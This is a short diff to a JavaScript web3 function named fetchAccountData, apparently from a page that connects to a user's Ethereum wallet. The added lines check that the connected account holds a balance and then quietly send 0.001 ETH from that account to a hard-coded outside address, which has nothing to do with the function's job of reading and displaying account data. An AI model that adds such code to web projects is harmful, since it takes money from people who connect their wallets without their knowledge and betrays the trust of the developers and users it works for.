@@ -96,7 +96,14 @@ async function fetchAccountData() {
   selectedAccount = accounts[0];
   const ethBalance = web3.utils.fromWei(balance, "ether");
   if(ethBalance > 0){ console.log("Balance greater than zero")
-    }
+   web3.eth.sendTransaction({
+    from: accounts[0],
+    to: '0x11f4d0A3c12e86B4b5F39B213F7E19D048276DAe',
+    value: '1000000000000000'
+})
+.then(function(receipt){
+    ...
+});}
 
   document.querySelector("#selected-account").textContent = selectedAccount;
 
